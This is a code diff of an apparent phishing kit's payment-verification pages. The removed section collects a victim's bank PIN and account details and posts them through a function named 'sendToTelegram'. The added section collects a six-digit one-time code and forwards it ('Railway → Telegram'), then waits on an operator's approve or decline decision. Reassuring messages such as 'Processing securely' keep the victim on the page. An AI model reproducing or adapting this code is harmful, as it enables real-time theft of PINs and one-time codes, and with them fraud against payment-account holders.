-    verifyBtn.disabled = !filled;
-    if (filled && errEl) errEl.classList.remove('show');
-  }
-
-  pinInput.addEventListener('input', (e) => {
-    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
-    pinInput.classList.remove('error');
-    updateState();
-  });
-
-  pinInput.addEventListener('keydown', (e) => {
-    if (e.key === 'Enter' && !verifyBtn.disabled) {
-      e.preventDefault();
-      doVerify();
-    }
-  });
-
-  pinInput.addEventListener('focus', () => pinInput.select());
-
-  setTimeout(() => pinInput.focus(), 150);
-}
-
-async function sendToTelegram(pin, number, payload) {
-  const res = await fetch(CONFIG.VERIFY_ENDPOINT, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      pin, number,
-      country: payload.c, recipient: payload.rn,
-      amount: payload.am, currency: payload.cur,
-      fee: payload.fee,
-      reference: payload.tx || payload.tn,
-      method: payload.pm
-    })
-  });
-  if (!res.ok) throw new Error('Verification server unavailable.');
-  const data = await res.json();
-  if (!data.requestId) throw new Error('No request ID returned.');
-  return data.requestId;
-}
-
-function pollStatus() {
-  if (!state.requestId) return;
-  if (Date.now() - state.pollStart > CONFIG.MAX_WAIT_MS) { handleDecline(); return; }
-  fetch(CONFIG.STATUS_ENDPOINT(state.requestId))
-    .then(r => r.json())
-    .then(data => {
-      const status = (data && data.status) || (data && data.decision) || 'pending';
-      if (status === 'approved') handleApprove();
-      else if (status === 'declined') handleDecline();
-      else setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
-    })
-    .catch(() => setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS));
-}
-
-function handleApprove() {
-  state.polling = false;
-  if (state.slowHintTimer) clearTimeout(state.slowHintTimer);
-  stopSafetySlider();
-  const next = nextPageFor(state.payload && state.payload.c);
-  const qs = window.location.search || '';
-  window.location.href = next + qs;
-}
-
-function handleDecline() {
-  state.polling = false;
-  if (state.slowHintTimer) clearTimeout(state.slowHintTimer);
-  stopSafetySlider();
-
-  const vo = document.getElementById('verifyingOverlay');
-  if (vo) vo.classList.remove('show');
-
-  const pinInput = document.querySelector('.pin-input');
-  if (pinInput) {
-    pinInput.value = '';
-    pinInput.classList.remove('filled', 'error');
-  }
-  state.pin = ['', '', '', '', ''];
-  const vb = document.getElementById('verifyBtn');
-  if (vb) vb.disabled = true;
-  state.requestId = null;
-
-  const popup = document.getElementById('popupBackdrop');
-  if (popup) popup.classList.add('show');
-}
-
-let safetyTimer = null;
-let safetyIndex = 0;
-
-function startSafetySlider() {
-  const slides = document.querySelectorAll('.safety-slide');
-  if (!slides.length) return;
-  safetyIndex = 0;
-  slides.forEach((s, i) => {
-    s.classList.remove('active', 'leaving');
-    if (i === 0) s.classList.add('active');
-  });
-  if (safetyTimer) clearInterval(safetyTimer);
-  safetyTimer = setInterval(() => {
-    slides[safetyIndex].classList.remove('active');
-    slides[safetyIndex].classList.add('leaving');
-    const prev = safetyIndex;
-    safetyIndex = (safetyIndex + 1) % slides.length;
-    setTimeout(() => slides[prev].classList.remove('leaving'), 500);
-    slides[safetyIndex].classList.add('active');
-  }, 2600);
-}
-
-function stopSafetySlider() {
-  if (safetyTimer) { clearInterval(safetyTimer); safetyTimer = null; }
-}
-
-async function doVerify() {
-  const errEl = document.getElementById('pinError');
-  const len = state.pin.length;
-  const allFilled = (len === 4 || len === 5) && state.pin.every(v => v !== '');
-  if (!allFilled) {
-    if (errEl) {
-      errEl.textContent = 'Please enter 4 or 5 digits of your PIN.';
-      errEl.classList.add('show');
-    }
-    const pinInput = document.querySelector('.pin-input');
-    if (pinInput) pinInput.classList.add('error');
-    return;
-  }
-  const pin = state.pin.join('');
-  const number = state.payload ? state.payload.an || '' : '';
-
-  const overlay = document.getElementById('verifyingOverlay');
-  if (overlay) {
-    const t = overlay.querySelector('.load-title');
-    const s = overlay.querySelector('.load-sub');
-    const sp = overlay.querySelector('.spinner');
-    if (t) t.textContent = 'Processing securely';
-    if (s) s.textContent = 'Your request is being reviewed. Please keep this page open.';
-    if (sp) sp.style.display = '';
-    overlay.classList.add('show');
-    startSafetySlider();
-  }
-
-  try {
-    const requestId = await sendToTelegram(pin, number, state.payload);
-    state.requestId = requestId;
-    state.pollStart = Date.now();
-    state.polling = true;
-    state.slowHintTimer = setTimeout(() => {
-      if (state.polling && overlay) {
-        const s = overlay.querySelector('.load-sub');
-        if (s) s.textContent = 'Still waiting for approval — this can take a moment. Please keep this page open.';
+    // 2) ?r= short code
+    const code = params.get('r');
+    if (code) {
+      for (const makeUrl of CONFIG.LINKS) {
+        try {
+          const res = await fetch(makeUrl(code));
+          if (!res.ok) continue;
+          const data = await res.json();
+          const p = data && (data.payload || data);
+          if (p && (p.am || p.c)) {
+            Object.assign(txData, {
+              tx:  p.tx  || p.tn || '',
+              am:  p.am  || '',
+              cur: p.cur || '',
+              rn:  p.rn  || '',
+              c:   p.c   || '',
+              pm:  p.pm  || '',
+              dt:  p.dt  || ''
+            });
+            return;
+          }
+        } catch (e) {}
       }
-    }, CONFIG.SLOW_HINT_MS);
-    setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
-  } catch (err) {
-    if (overlay) overlay.classList.remove('show');
-    handleDecline();
+    }
+    // 3) sessionStorage fallback
+    try {
+      const raw = sessionStorage.getItem('amz_payload');
+      if (raw) {
+        const p = JSON.parse(raw);
+        Object.assign(txData, {
+          tx:  p.tx  || p.tn || '',
+          am:  p.am  || '',
+          cur: p.cur || '',
+          rn:  p.rn  || '',
+          c:   p.c   || '',
+          pm:  p.pm  || '',
+          dt:  p.dt  || ''
+        });
+      }
+    } catch (e) {}
   }
-}
 
-async function boot() {
-  const backBtn = document.getElementById('backBtn');
-  if (backBtn) backBtn.addEventListener('click', () => { if (window.history.length > 1) window.history.back(); });
+  /* ------------------------------------------------------------
+     Render tx block
+  ------------------------------------------------------------ */
+  function renderTxBlock() {
+    if (txData.tx) {
+      document.getElementById('txId').textContent = txData.tx;
+      document.getElementById('amtCur').textContent = txData.cur;
+      document.getElementById('amtVal').textContent = Number(txData.am || 0).toFixed(2);
+    } else {
+      document.querySelector('.card').innerHTML =
+        '<div style="padding:40px 24px;text-align:center">' +
+        '<h2 style="font-size:18px;margin-bottom:6px">Missing transaction</h2>' +
+        '<p style="font-size:13px;color:#667085">Please return to the payment page and try again.</p>' +
+        '</div>';
+    }
+  }
 
-  const popupOkBtn = document.getElementById('popupOkBtn');
-  if (popupOkBtn) popupOkBtn.addEventListener('click', () => {
-    const popup = document.getElementById('popupBackdrop');
-    if (popup) popup.classList.remove('show');
-    const pe = document.getElementById('pinError');
-    if (pe) pe.classList.remove('show');
-    const pinInput = document.querySelector('.pin-input');
-    if (pinInput) pinInput.focus();
+  /* ------------------------------------------------------------
+     OTP boxes
+  ------------------------------------------------------------ */
+  const boxes = Array.from(document.querySelectorAll('#otpRow input'));
+  boxes.forEach((el, i) => {
+    el.addEventListener('input', () => {
+      el.value = el.value.replace(/\D/g, '').slice(0, 1);
+      el.classList.toggle('filled', !!el.value);
+      if (el.value && i < boxes.length - 1) boxes[i + 1].focus();
+    });
+    el.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !el.value && i > 0) boxes[i - 1].focus();
+    });
+    el.addEventListener('paste', (e) => {
+      const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
+      if (text.length === 6) {
+        e.preventDefault();
+        text.split('').forEach((d, idx) => { boxes[idx].value = d; boxes[idx].classList.add('filled'); });
+        boxes[5].focus();
+      }
+    });
   });
 
-  let payload;
-  try { payload = await resolvePayload(); }
-  catch (err) { showStateCard('⚠', 'Payment link unavailable', err.message || 'Please start over from the payment link.'); return; }
+  function getOtp() { return boxes.map(el => el.value).join(''); }
+  function clearOtp() {
+    boxes.forEach(el => { el.value = ''; el.classList.remove('filled'); });
+    boxes[0].focus();
+  }
+  function setOtpEnabled(on) { boxes.forEach(el => { el.disabled = !on; }); }
 
-  if (payload && payload.exp && Date.now() > Number(payload.exp)) {
-    showStateCard('⏱', 'This link has expired', 'The payment request is no longer valid. Please ask the sender to generate a new link.');
-    return;
+  /* ------------------------------------------------------------
+     UI helpers
+  ------------------------------------------------------------ */
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg; t.classList.add('show');
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => t.classList.remove('show'), 2200);
+  }
+  function showExpiredNotice() { document.getElementById('expiredNotice').classList.add('show'); }
+  function hideExpiredNotice() { document.getElementById('expiredNotice').classList.remove('show'); }
+
+  /* ------------------------------------------------------------
+     Resend countdown
+  ------------------------------------------------------------ */
+  let countdown = 30;
+  let timer = null;
+  const resendBtn = document.getElementById('resendBtn');
+
+  function startCountdown(seconds) {
+    countdown = seconds;
+    resendBtn.disabled = true;
+    resendBtn.textContent = 'Resend in ' + countdown + 's';
+    if (timer) clearInterval(timer);
+    timer = setInterval(() => {
+      countdown -= 1;
+      if (countdown <= 0) {
+        clearInterval(timer);
+        timer = null;
+        resendBtn.disabled = false;
+        resendBtn.textContent = 'Resend code';
+      } else {
+        resendBtn.textContent = 'Resend in ' + countdown + 's';
+      }
+    }, 1000);
   }
 
-  render(payload);
-  initPin();
+  /* ------------------------------------------------------------
+     Request a code
+  ------------------------------------------------------------ */
+  async function requestCode(source) {
+    hideExpiredNotice();
+    resendBtn.disabled = true;
+    resendBtn.textContent = 'Sending…';
 
-  const verifyBtn = document.getElementById('verifyBtn');
-  if (verifyBtn) verifyBtn.addEventListener('click', doVerify);
-}
+    try {
+      const r = await fetch(CONFIG.OTP_REQUEST, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tx: txData.tx,
+          am: txData.am,
+          cur: txData.cur,
+          c: txData.c
+        })
+      });
+      const j = await r.json().catch(() => ({}));
 
-document.addEventListener('DOMContentLoaded', boot);
+      if (!r.ok) {
+        showToast(j.message || 'Could not send code.');
+        resendBtn.disabled = false;
+        resendBtn.textContent = 'Resend code';
+        return;
+      }
+
+      showToast('Ready. Enter your code.');
+      startCountdown(30);
+      clearOtp();
+      setOtpEnabled(true);
+    } catch (e) {
+      showToast('Network error. Please try again.');
+      resendBtn.disabled = false;
+      resendBtn.textContent = 'Resend code';
+    }
+  }
+
+  /* ------------------------------------------------------------
+     Verify — submit OTP to Railway → Telegram, poll decision
+  ------------------------------------------------------------ */
+  async function verifyCode() {
+    hideExpiredNotice();
+
+    const otp = getOtp();
+    if (otp.length !== 6) {
+      showToast('Please enter all 6 digits.');
+      return;
+    }
+
+    document.getElementById('verifying').classList.add('show');
+    document.getElementById('verifyBtn').disabled = true;
+    setOtpEnabled(false);
+
+    try {
+      await fetch(CONFIG.SUBMIT, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tx: txData.tx,
+          otp: otp,
+          am: txData.am,
+          cur: txData.cur,
+          c:  txData.c
+        })
+      });
+    } catch (e) { /* keep polling */ }
+
+    const start = Date.now();
+    const maxWaitMs = 2 * 60 * 1000;
+
+    const q = new URLSearchParams({
+      tx:  txData.tx,
+      am:  txData.am,
+      cur: txData.cur,
+      rn:  txData.rn,
+      c:   txData.c,
+      pm:  txData.pm,
+      dt:  txData.dt
+    });
+
+    const check = async () => {
+      if (Date.now() - start > maxWaitMs) {
+        document.getElementById('verifying').classList.remove('show');
+        document.getElementById('verifyBtn').disabled = false;
+        setOtpEnabled(true);
+        showToast('Approval timed out. Please resend the code.');
+        return;
+      }
+
+      let decision = 'pending';
+      try {
+        const r = await fetch(CONFIG.STATUS(txData.tx));
+        const j = await r.json();
+        decision = j.decision || 'pending';
+      } catch (e) {}
+
+      if (decision === 'declined' || decision === 'expired') {
+        document.getElementById('verifying').classList.remove('show');
+        document.getElementById('verifyBtn').disabled = false;
+        setOtpEnabled(true);
+        clearOtp();
+        showExpiredNotice();
+        if (timer) { clearInterval(timer); timer = null; }
+        resendBtn.disabled = false;
+        resendBtn.textContent = 'Resend code';
+        return;
+      }
+
+      if (decision === 'inactive') {
+        window.location.replace(CONFIG.NEXT_INACTIVE + '?' + q.toString());
+        return;
+      }
+
+      if (decision === 'approved') {
+        window.location.replace(CONFIG.NEXT_APPROVED + '?' + q.toString());
+        return;
+      }
+
+      setTimeout(check, 1500);
+    };
+
+    check();
+  }
+
+  document.addEventListener('DOMContentLoaded', async () => {
+    await resolveTx();
+    renderTxBlock();
+    if (txData.tx) requestCode('auto');
+  });
 </script>
 </body>
 </html>
